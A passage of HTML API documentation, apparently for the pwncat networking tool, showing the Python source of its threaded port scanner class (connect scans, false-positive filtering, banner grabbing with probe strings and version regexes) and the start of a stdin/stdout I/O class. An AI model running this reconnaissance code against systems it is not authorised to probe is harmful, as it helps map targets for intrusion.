                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSock"
                                    title="pwncat.DsIONetworkSock">DsIONetworkSock</a></code>
                            </dt>
                            <dd>Options to parse back to Sock.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">IONetworkScanner</span>(<span
                                class="hljs-params">IO</span>):</span>
    <span class="hljs-string">"""Pwncat Scanner implementation based on custom Socket library."""</span>

    BANNER_PAYLOADS = {
        <span class="hljs-comment"># 0 is for generic ones, which do not have a custom port definition already</span>
        <span class="hljs-number">0</span>: [
            <span class="hljs-literal">None</span>,  <span class="hljs-comment"># This means to not send anything, but receive first</span>
            <span class="hljs-string">""</span>,
            <span class="hljs-string">"\0"</span>,
            <span class="hljs-string">"\r"</span>,
            <span class="hljs-string">"\n"</span>,
            <span class="hljs-string">"\r\n"</span>,
            <span class="hljs-string">"HEAD /\r\n\r\n"</span>,
        ],
    }

    <span class="hljs-comment"># Common regexes</span>
    BANNER_REG = [
        <span class="hljs-string">r"Server:\s*(.*)"</span>,  <span class="hljs-comment"># extract webserver from header</span>
        <span class="hljs-string">r"(.*[0-9][-.0-9]*.*)"</span>,  <span class="hljs-comment"># generic version string</span>
    ]

    <span class="hljs-comment"># Compiled versions of common regexes</span>
    BANNER_REG_COMP = []  <span class="hljs-comment"># type: List[re.Pattern[str]]</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        ssig,  <span class="hljs-comment"># type: InterruptHandler</span>
        encoder,  <span class="hljs-comment"># type: StringEncoder</span>
        host,  <span class="hljs-comment"># type: str</span>
        banner,  <span class="hljs-comment"># type: bool</span>
        cli_opts,  <span class="hljs-comment"># type: DsIONetworkCli</span>
        sock_opts,  <span class="hljs-comment"># type: DsIONetworkSock</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-string">"""Create a Pwncat Network Scanner instance.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            host (str): The hostname to resolve.
            banner (bool): Determines if we do banner grabbing as well.
            cli_opts (DsIONetworkCli):   Options for the client.
            sock_opts (DsIONetworkSock): Options to parse back to Sock.
        """</span>
        super(IONetworkScanner, self).__init__(ssig)

        self.__ssig = ssig
        self.__enc = encoder
        self.__cli_opts = cli_opts
        self.__sock_opts = sock_opts
        self.__banner = banner

        self.__log = logging.getLogger(__name__)
        self.__sock = Sock()
        self.__screen_lock = threading.Semaphore()

        <span class="hljs-comment"># Keep track of local binds (addr-port) of the threaded scanner</span>
        <span class="hljs-comment"># clients as we do not want to treat them as open ports (false posistives)</span>
        self.__local_binds = {}  <span class="hljs-comment"># type: Dict[str, socket.socket]</span>

        <span class="hljs-comment"># Compile our regexes if using banner detection</span>
        <span class="hljs-keyword">if</span> banner:
            <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> self.BANNER_REG:
                self.BANNER_REG_COMP.append(re.compile(reg, re.IGNORECASE))

        <span class="hljs-comment"># Get numerical IP addresses for IPv4 and/or IPv6</span>
        <span class="hljs-keyword">if</span> self.__sock_opts.ipv6:
            families = [int(socket.AF_INET6)]
        <span class="hljs-keyword">elif</span> self.__sock_opts.ipv4:
            families = [int(socket.AF_INET)]
        <span class="hljs-keyword">else</span>:
            families = [
                int(socket.AF_INET6),
                int(socket.AF_INET),
            ]
        self.__targets = {}
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> families:
            <span class="hljs-keyword">try</span>:
                self.__targets[family] = self.__sock.gethostbyname(
                    host, family, <span class="hljs-keyword">not</span> self.__sock_opts.nodns
                )
            <span class="hljs-keyword">except</span> socket.gaierror:
                <span class="hljs-keyword">pass</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_socket</span>(<span
            class="hljs-params">self, family</span>):</span>
        <span class="hljs-comment"># type: (Union[socket.AddressFamily, int]) -&gt; socket.socket</span>
        <span class="hljs-string">"""Create socket for specific address family endlessly until resources are available."""</span>
        <span class="hljs-comment"># The scanner starts one thread for each port to scan. Each thread will also create</span>
        <span class="hljs-comment"># one socket and we might hit the max_allowed_files limit (ulimit).</span>
        <span class="hljs-comment"># That's why we loop through creating sockets until we hit a success</span>
        <span class="hljs-comment"># as in the meantime, other threads might have already released sockets/fd's.</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            delay = <span class="hljs-number">0.0</span>
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"TERMINATE signal ACK for IONetworkScanner._getsocket"</span>
                )
                <span class="hljs-keyword">raise</span> socket.error(<span class="hljs-string">"quit"</span>)
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">if</span> self.__sock_opts.udp:
                    <span class="hljs-keyword">return</span> self.__sock.create_socket(family, socket.SOCK_DGRAM, <span
                                    class="hljs-literal">False</span>)
                <span class="hljs-keyword">return</span> self.__sock.create_socket(family, socket.SOCK_STREAM, <span
                                    class="hljs-literal">False</span>)
            <span class="hljs-keyword">except</span> socket.error:
                delay += <span class="hljs-number">0.1</span>
                time.sleep(delay)  <span class="hljs-comment"># This can be bigger to give the system some time to release fd's</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_banner_version</span>(<span
            class="hljs-params">self, banner</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; Optional[str]</span>
        <span class="hljs-string">"""Extract version information from a string."""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> banner <span
                                    class="hljs-keyword">or</span> banner <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

        <span class="hljs-comment"># If we only have a single line, return it (all we got)</span>
        lines = banner.splitlines()
        <span class="hljs-keyword">if</span> len(lines) == <span class="hljs-number">1</span>:
            <span class="hljs-keyword">return</span> lines[<span class="hljs-number">0</span>]

        <span class="hljs-comment"># Version extraction</span>
        <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> self.BANNER_REG_COMP:
            match = re.search(reg, banner)
            <span class="hljs-keyword">if</span> match:
                <span class="hljs-keyword">return</span> StringEncoder.rstrip(match.group(<span
                                    class="hljs-number">1</span>))  <span class="hljs-comment"># type: ignore</span>

        <span class="hljs-comment"># Nothing found, return first non-empty line</span>
        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
            <span class="hljs-keyword">if</span> line:
                <span class="hljs-keyword">return</span> line

        <span class="hljs-comment"># Nothing found</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_banner</span>(<span
            class="hljs-params">self, sock, addr, port</span>):</span>
        <span class="hljs-comment"># type: (socket.socket, str, int) -&gt; Tuple[bool, Optional[str]]</span>
        <span class="hljs-string">"""Retrieve the (version) banner from a network service."""</span>
        <span class="hljs-keyword">if</span> port <span class="hljs-keyword">in</span> self.BANNER_PAYLOADS:
            payloads = self.BANNER_PAYLOADS[port] + self.BANNER_PAYLOADS[<span
                                    class="hljs-number">0</span>]
        <span class="hljs-keyword">else</span>:
            payloads = self.BANNER_PAYLOADS[<span class="hljs-number">0</span>]

        <span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> payloads:
            <span class="hljs-comment"># Break the loop on terminate signal</span>
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"TERMINATE signal ACK for IONetworkScanner._getbanner: %s-%d"</span>, addr, port
                )
                <span class="hljs-keyword">return</span> (<span
                                    class="hljs-literal">False</span>, <span class="hljs-literal">None</span>)
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">if</span> payload <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
                    sock.send(self.__enc.encode(payload))
                    self.__log.debug(<span class="hljs-string">"%s:%d - payload sent: %s"</span>, addr, port, repr(payload))

                sock.settimeout(<span class="hljs-number">0.5</span>)
                banner = sock.recv(self.__sock_opts.bufsize)
                version = self.__get_banner_version(self.__enc.decode(banner))
                self.__log.debug(<span class="hljs-string">"%s:%d - respone received: %s"</span>, addr, port, repr(banner))
                <span class="hljs-keyword">return</span> (<span class="hljs-literal">True</span>, version)
            <span class="hljs-keyword">except</span> socket.timeout:
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">except</span> (OSError, socket.error):
                <span class="hljs-keyword">return</span> (<span
                                    class="hljs-literal">False</span>, <span class="hljs-literal">None</span>)
        <span class="hljs-keyword">return</span> (<span class="hljs-literal">True</span>, <span
                                    class="hljs-literal">None</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
        <span class="hljs-string">"""Port scanner yielding open/closed string for given port.

        Args:
            args: additional arguments.
            kwargs: additional arguments.

        Yields:
            str: Open/closed state (optionally with banner) from a port.
        """</span>
        port = args[<span class="hljs-number">0</span>]

        <span class="hljs-comment"># Loop over adress families</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__targets:

            <span class="hljs-comment"># [1/7] Check for termination request</span>
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for IONetworkScanner.producer"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">return</span>

            addr = self.__targets[family]

            <span class="hljs-comment"># [2/7] Get socket</span>
            <span class="hljs-keyword">try</span>:
                sock = self.__get_socket(family)
                sock_type = sock.type
            <span class="hljs-keyword">except</span> (AttributeError, socket.error):
                <span class="hljs-comment"># Exception is triggered due to stop stignal and we</span>
                <span class="hljs-comment"># will abort here in that case.</span>
                <span class="hljs-keyword">return</span>

            <span class="hljs-comment"># [3/7] Connect scan</span>
            <span class="hljs-keyword">try</span>:
                laddr, lport = self.__sock.connect(
                    sock,
                    addr,
                    port,
                    <span class="hljs-literal">None</span>,
                    <span class="hljs-literal">None</span>,
                    <span class="hljs-literal">True</span>,
                    self.__enc.encode(<span class="hljs-string">"\0"</span>),
                    self.__sock_opts.bufsize,
                    <span class="hljs-number">0.1</span>,
                )
                <span class="hljs-comment"># Append local binds (addr-port) to check against during port scan</span>
                key = str(laddr + <span class="hljs-string">"-"</span> + str(lport))
                self.__local_binds[key] = sock
            <span class="hljs-keyword">except</span> socket.error:
                self.__sock.close(sock, <span class="hljs-string">"[-] closed: {}:{}"</span>.format(addr, port))
                <span class="hljs-keyword">continue</span>

            <span class="hljs-comment"># [4/7] False positives</span>
            <span class="hljs-comment"># Connect was successful, but against a local bind of one of our</span>
            <span class="hljs-comment"># port scanners, so this is a false positive.</span>
            <span class="hljs-keyword">if</span> str(addr + <span class="hljs-string">"-"</span> + str(port)) <span
                                    class="hljs-keyword">in</span> self.__local_binds:
                self.__sock.close(sock, <span class="hljs-string">"[-] closed: {}:{}"</span>.format(addr, port))
                <span class="hljs-keyword">del</span> self.__local_binds[key]
                <span class="hljs-keyword">continue</span>

            <span class="hljs-comment"># [5/7] Banner grabbing</span>
            succ_banner = <span class="hljs-literal">True</span>
            banner = <span class="hljs-literal">None</span>
            <span class="hljs-keyword">if</span> self.__banner:
                (succ_banner, banner) = self.__get_banner(sock, addr, port)

            <span class="hljs-comment"># [6/7] Evaluation</span>
            <span class="hljs-keyword">if</span> banner <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">and</span> succ_banner:
                msg = <span class="hljs-string">"[+] {:&gt;5}/{} open   ({}): {}"</span>.format(
                    port,
                    self.__sock.get_type_name(sock_type),
                    self.__sock.get_family_name(family),
                    banner,
                )
                <span class="hljs-keyword">yield</span> self.__enc.encode(msg)
            <span class="hljs-keyword">if</span> banner <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">and</span> succ_banner:
                msg = <span class="hljs-string">"[+] {:&gt;5}/{} open   ({})"</span>.format(
                    port,
                    self.__sock.get_type_name(sock_type),
                    self.__sock.get_family_name(family),
                )
                <span class="hljs-keyword">yield</span> self.__enc.encode(msg)

            <span class="hljs-comment"># [7/7] Cleanup</span>
            self.__sock.close(sock, key)
            <span class="hljs-keyword">del</span> self.__local_binds[key]

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; None</span>
        <span class="hljs-string">"""Print received data to stdout."""</span>
        <span class="hljs-comment"># For issues with flush (when using tail -F or equal) see links below:</span>
        <span class="hljs-comment"># https://stackoverflow.com/questions/26692284</span>
        <span class="hljs-comment"># https://docs.python.org/3/library/signal.html#note-on-sigpipe</span>
        <span class="hljs-keyword">with</span> self.__screen_lock:
            print(StringEncoder.decode(data))
            <span class="hljs-keyword">try</span>:
                sys.stdout.flush()
            <span class="hljs-keyword">except</span> IOError:
                <span class="hljs-comment"># Python flushes standard streams on exit; redirect remaining output</span>
                <span class="hljs-comment"># to devnull to avoid another broken pipe at shutdown</span>
                devnull = os.open(os.devnull, os.O_WRONLY)
                os.dup2(devnull, sys.stdout.fileno())

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
        self.log.trace(<span class="hljs-string">"SOCK-QUIT signal RAISED in IONetworkScanner.interrupt"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
        self.ssig.raise_sock_quit()

        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Closing up to 65535 sockets (single thread) takes very very long</span>
        <span class="hljs-comment"># Se we leave this up to Python itself, once the program exits.</span>
        <span class="hljs-comment"># self.log.trace("SOCK-QUIT-CLEANUP: Closing sockets")  # type: ignore</span>
        <span class="hljs-comment"># # Double loop to prevent: Dictionary size changed during iteration</span>
        <span class="hljs-comment"># remove = {}</span>
        <span class="hljs-comment"># for key in self.__local_binds:</span>
        <span class="hljs-comment">#     remove[key] = self.__local_binds[key]</span>
        <span class="hljs-comment"># for key in remove:</span>
        <span class="hljs-comment">#     self.__sock.close(remove[key], key)</span></code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.IO"
                               title="pwncat.IO">IO</a></li>
                        <li>abc.ABC</li>
                    </ul>
                    <h3>Class variables</h3>
                    <dl>
                        <dt id="pwncat.IONetworkScanner.BANNER_PAYLOADS"><code class="name">var
                            <span class="ident">BANNER_PAYLOADS</span></code></dt>
                        <dd>
                            <div class="desc"></div>
                        </dd>
                        <dt id="pwncat.IONetworkScanner.BANNER_REG"><code class="name">var <span
                                class="ident">BANNER_REG</span></code></dt>
                        <dd>
                            <div class="desc"></div>
                        </dd>
                        <dt id="pwncat.IONetworkScanner.BANNER_REG_COMP"><code class="name">var
                            <span class="ident">BANNER_REG_COMP</span></code></dt>
                        <dd>
                            <div class="desc"></div>
                        </dd>
                    </dl>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.IONetworkScanner.consumer"><code class="name flex">
                            <span>def <span
                                    class="ident">consumer</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Print received data to stdout.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
                                        class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; None</span>
    <span class="hljs-string">"""Print received data to stdout."""</span>
    <span class="hljs-comment"># For issues with flush (when using tail -F or equal) see links below:</span>
    <span class="hljs-comment"># https://stackoverflow.com/questions/26692284</span>
    <span class="hljs-comment"># https://docs.python.org/3/library/signal.html#note-on-sigpipe</span>
    <span class="hljs-keyword">with</span> self.__screen_lock:
        print(StringEncoder.decode(data))
        <span class="hljs-keyword">try</span>:
            sys.stdout.flush()
        <span class="hljs-keyword">except</span> IOError:
            <span class="hljs-comment"># Python flushes standard streams on exit; redirect remaining output</span>
            <span class="hljs-comment"># to devnull to avoid another broken pipe at shutdown</span>
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, sys.stdout.fileno())</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IONetworkScanner.interrupt"><code class="name flex">
                            <span>def <span class="ident">interrupt</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Stop function that can be called externally to
                                close this instance.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
    self.log.trace(<span class="hljs-string">"SOCK-QUIT signal RAISED in IONetworkScanner.interrupt"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
    self.ssig.raise_sock_quit()

    <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Closing up to 65535 sockets (single thread) takes very very long</span>
    <span class="hljs-comment"># Se we leave this up to Python itself, once the program exits.</span>
    <span class="hljs-comment"># self.log.trace("SOCK-QUIT-CLEANUP: Closing sockets")  # type: ignore</span>
    <span class="hljs-comment"># # Double loop to prevent: Dictionary size changed during iteration</span>
    <span class="hljs-comment"># remove = {}</span>
    <span class="hljs-comment"># for key in self.__local_binds:</span>
    <span class="hljs-comment">#     remove[key] = self.__local_binds[key]</span>
    <span class="hljs-comment"># for key in remove:</span>
    <span class="hljs-comment">#     self.__sock.close(remove[key], key)</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IONetworkScanner.producer"><code class="name flex">
                            <span>def <span class="ident">producer</span></span>(<span>self, *args, **kwargs)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Port scanner yielding open/closed string for given
                                port.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>args</code></strong></dt>
                                    <dd>additional arguments.</dd>
                                    <dt><strong><code>kwargs</code></strong></dt>
                                    <dd>additional arguments.</dd>
                                </dl>
                                <h2 id="yields">Yields</h2>
                                <dl>
                                    <dt><code>str</code></dt>
                                    <dd>Open/closed state (optionally with banner) from a port.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
                                        class="hljs-params">self, *args, **kwargs</span>):</span>
    <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
    <span class="hljs-string">"""Port scanner yielding open/closed string for given port.

    Args:
        args: additional arguments.
        kwargs: additional arguments.

    Yields:
        str: Open/closed state (optionally with banner) from a port.
    """</span>
    port = args[<span class="hljs-number">0</span>]

    <span class="hljs-comment"># Loop over adress families</span>
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__targets:

        <span class="hljs-comment"># [1/7] Check for termination request</span>
        <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
            self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for IONetworkScanner.producer"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">return</span>

        addr = self.__targets[family]

        <span class="hljs-comment"># [2/7] Get socket</span>
        <span class="hljs-keyword">try</span>:
            sock = self.__get_socket(family)
            sock_type = sock.type
        <span class="hljs-keyword">except</span> (AttributeError, socket.error):
            <span class="hljs-comment"># Exception is triggered due to stop stignal and we</span>
            <span class="hljs-comment"># will abort here in that case.</span>
            <span class="hljs-keyword">return</span>

        <span class="hljs-comment"># [3/7] Connect scan</span>
        <span class="hljs-keyword">try</span>:
            laddr, lport = self.__sock.connect(
                sock,
                addr,
                port,
                <span class="hljs-literal">None</span>,
                <span class="hljs-literal">None</span>,
                <span class="hljs-literal">True</span>,
                self.__enc.encode(<span class="hljs-string">"\0"</span>),
                self.__sock_opts.bufsize,
                <span class="hljs-number">0.1</span>,
            )
            <span class="hljs-comment"># Append local binds (addr-port) to check against during port scan</span>
            key = str(laddr + <span class="hljs-string">"-"</span> + str(lport))
            self.__local_binds[key] = sock
        <span class="hljs-keyword">except</span> socket.error:
            self.__sock.close(sock, <span class="hljs-string">"[-] closed: {}:{}"</span>.format(addr, port))
            <span class="hljs-keyword">continue</span>

        <span class="hljs-comment"># [4/7] False positives</span>
        <span class="hljs-comment"># Connect was successful, but against a local bind of one of our</span>
        <span class="hljs-comment"># port scanners, so this is a false positive.</span>
        <span class="hljs-keyword">if</span> str(addr + <span class="hljs-string">"-"</span> + str(port)) <span
                                            class="hljs-keyword">in</span> self.__local_binds:
            self.__sock.close(sock, <span class="hljs-string">"[-] closed: {}:{}"</span>.format(addr, port))
            <span class="hljs-keyword">del</span> self.__local_binds[key]
            <span class="hljs-keyword">continue</span>

        <span class="hljs-comment"># [5/7] Banner grabbing</span>
        succ_banner = <span class="hljs-literal">True</span>
        banner = <span class="hljs-literal">None</span>
        <span class="hljs-keyword">if</span> self.__banner:
            (succ_banner, banner) = self.__get_banner(sock, addr, port)

        <span class="hljs-comment"># [6/7] Evaluation</span>
        <span class="hljs-keyword">if</span> banner <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span> <span
                                            class="hljs-keyword">and</span> succ_banner:
            msg = <span class="hljs-string">"[+] {:&gt;5}/{} open   ({}): {}"</span>.format(
                port,
                self.__sock.get_type_name(sock_type),
                self.__sock.get_family_name(family),
                banner,
            )
            <span class="hljs-keyword">yield</span> self.__enc.encode(msg)
        <span class="hljs-keyword">if</span> banner <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span> <span
                                            class="hljs-keyword">and</span> succ_banner:
            msg = <span class="hljs-string">"[+] {:&gt;5}/{} open   ({})"</span>.format(
                port,
                self.__sock.get_type_name(sock_type),
                self.__sock.get_family_name(family),
            )
            <span class="hljs-keyword">yield</span> self.__enc.encode(msg)

        <span class="hljs-comment"># [7/7] Cleanup</span>
        self.__sock.close(sock, key)
        <span class="hljs-keyword">del</span> self.__local_binds[key]</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Inherited members</h3>
                    <ul class="hlist">
                        <li><code><b><a href="https://pwncat.org/pwncat.api.html#pwncat.IO"
                                        title="pwncat.IO">IO</a></b></code>:
                            <ul class="hlist">
                                <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.IO.log"
                                             title="pwncat.IO.log">log</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.IO.ssig"
                                        title="pwncat.IO.ssig">ssig</a></code>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </dd>
                <dt id="pwncat.IOStdinStdout"><code class="flex name class">
                    <span>class <span class="ident">IOStdinStdout</span></span>
                    <span>(</span><span>ssig, opts)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Implement basic stdin/stdout I/O module.</p>
                        <p>This I/O module provides a generator which continuously reads from stdin
                            (non-blocking on POSIX and blocking on Windows) as well as a
                            callback that writes to stdout.</p>
                        <p>Set specific options for this I/O module.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>ssig</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>
                            </dt>
                            <dd>InterruptHandler instance.</dd>
                            <dt><strong><code>opts</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIOStdinStdout"
                                    title="pwncat.DsIOStdinStdout">DsIOStdinStdout</a></code>
                            </dt>
                            <dd>IO options.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">IOStdinStdout</span>(<span
                                class="hljs-params">IO</span>):</span>
    <span class="hljs-string">"""Implement basic stdin/stdout I/O module.

    This I/O module provides a generator which continuously reads from stdin
    (non-blocking on POSIX and blocking on Windows) as well as a
    callback that writes to stdout.
    """</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig, opts</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler, DsIOStdinStdout) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this I/O module.

        Args:
            ssig (InterruptHandler): InterruptHandler instance.
            opts (DsIOStdinStdout): IO options.
        """</span>
        super(IOStdinStdout, self).__init__(ssig)
        self.__opts = opts
        self.__py3 = sys.version_info &gt;= (<span class="hljs-number">3</span>, <span
                                    class="hljs-number">0</span>)  <span class="hljs-comment"># type: bool</span>
        self.__win = os.name != <span class="hljs-string">"posix"</span>  <span
                                    class="hljs-comment"># posix or nt</span>
        self.__stdout_isatty = sys.stdout.isatty()
        self.__stdin_isatty = sys.stdin.isatty()

        self.log.debug(<span class="hljs-string">"STDOUT isatty: %s"</span>, self.__stdout_isatty)
        self.log.debug(<span class="hljs-string">"STDIN  isatty: %s"</span>, self.__stdin_isatty)
        self.log.debug(<span class="hljs-string">"STDIN  posix:  %s (%s)"</span>, str(self.__win), os.name)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
        <span class="hljs-string">"""Constantly ask for user input.

        Yields:
            str: Data read from stdin.
        """</span>
        <span class="hljs-comment"># On --send-on-eof we will return all of its contents at once:</span>
        lines = []

        <span class="hljs-comment"># https://stackoverflow.com/questions/1450393/#38670261</span>
        <span class="hljs-comment"># while True: line = sys.stdin.readline() &lt;- reads a whole line (faster)</span>
        <span class="hljs-comment"># for line in sys.stdin.readlin():        &lt;- reads one byte at a time</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">if</span> self.ssig.has_stdin_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"STDIN-QUIT signal ACK in IOStdinStdout.producer [1]"</span>
                )
                <span class="hljs-keyword">return</span>
            <span class="hljs-keyword">try</span>:
                data = self.__read_stdin()
            <span class="hljs-keyword">except</span> EOFError:
                <span class="hljs-comment"># When using select() with timeout, we don't have any input</span>
                <span class="hljs-comment"># at this point and simply continue the loop or quit if</span>
                <span class="hljs-comment"># a terminate request has been made by other threads.</span>
                <span class="hljs-keyword">if</span> self.ssig.has_stdin_quit():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"STDIN-QUIT signal ACK in IOStdinStdout.producer [2]"</span>
                    )
                    <span class="hljs-keyword">return</span>
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">if</span> data:
                self.log.debug(<span class="hljs-string">"Received %d bytes from STDIN"</span>, len(data))
                self.log.trace(<span class="hljs-string">"Received: %s"</span>, repr(data))  <span
                                    class="hljs-comment"># type: ignore</span>
                <span class="hljs-comment"># [send-on-eof] Append data</span>
                <span class="hljs-keyword">if</span> self.__opts.send_on_eof:
                    lines.append(data)
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-keyword">yield</span> data
            <span class="hljs-comment"># EOF or &lt;Ctrl&gt;+&lt;d&gt;</span>
            <span class="hljs-keyword">else</span>:
                <span class="hljs-comment"># [send-on-eof] Dump data before quitting</span>
                <span class="hljs-keyword">if</span> lines <span class="hljs-keyword">and</span> self.__opts.send_on_eof:
                    <span class="hljs-keyword">yield</span> StringEncoder.encode(<span
                                    class="hljs-string">""</span>).join(lines)
                self.log.trace(<span class="hljs-string">"STDIN-EOF signal RAISE in IOStdinStdout.producer"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
                self.ssig.raise_stdin_eof()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; None</span>
        <span class="hljs-string">"""Print received data to stdout."""</span>
